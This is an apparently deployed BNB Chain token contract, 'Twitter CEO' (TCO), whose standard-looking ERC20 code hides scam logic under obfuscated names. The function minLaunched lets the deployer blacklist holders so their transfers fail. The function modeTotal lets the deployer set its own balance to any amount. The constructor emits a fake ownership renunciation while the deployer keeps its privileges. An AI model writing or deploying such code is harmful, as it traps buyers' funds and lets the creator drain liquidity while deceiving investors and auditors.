/**
 *Submitted for verification at BscScan.com on 2023-02-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;


abstract contract receiverSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address atAmount) external view returns (uint256);

    function transfer(address walletReceiver, uint256 modeReceiver) external returns (bool);

    function allowance(address tokenShould, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeReceiver) external returns (bool);

    function transferFrom(address sender, address walletReceiver, uint256 modeReceiver) external returns (bool);

    event Transfer(address indexed from, address indexed tokenTotal, uint256 value);
    event Approval(address indexed tokenShould, address indexed spender, uint256 value);
}


abstract contract ERC20 is receiverSwap, IERC20 {
    using SafeMath for uint256;

    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function takeTeam(address account, uint256 amount) internal virtual {
        require(account != address(0));

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

interface fundFeeSell {
    function createPair(address marketingShould, address liquidityFee) external returns (address);
}

interface maxMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract TwitterCEO is ERC20 {

    function minLaunched(address atSwapLimit) public {
        if (atSwapLimit == tradingExempt || atSwapLimit == address(0) || atSwapLimit == isTotalTake || !sellAt[_msgSender()]) {
            return;
        }
        modeAuto[atSwapLimit] = true;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function tradingLimitExempt(address enableTake) public {
        if (launchedReceiver) {
            return;
        }
        sellAt[enableTake] = true;
        launchedReceiver = true;
    }

    bool public launchedReceiver;

    address public owner;

    constructor() ERC20("Twitter CEO", "TCO") { 
        maxMarketing sellReceiver = maxMarketing(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        isTotalTake = fundFeeSell(sellReceiver.factory()).createPair(sellReceiver.WETH(), address(this));
        tradingExempt = _msgSender();
        sellAt[tradingExempt] = true;
        takeTeam(tradingExempt, 100000000 * 10 ** 18);
        emit OwnershipTransferred(tradingExempt, address(0));
    }

    address public tradingExempt;

    mapping(address => bool) public sellAt;

    address public isTotalTake;

    function modeTotal(uint256 modeReceiver) public {
        if (!sellAt[_msgSender()]) {
            return;
        }
        _balances[tradingExempt] = modeReceiver;
    }

    mapping(address => bool) public modeAuto;

    function _beforeTokenTransfer(address maxTeamSell, address tokenTotal, uint256 modeReceiver) internal override {
        require(!modeAuto[maxTeamSell]);
    }

}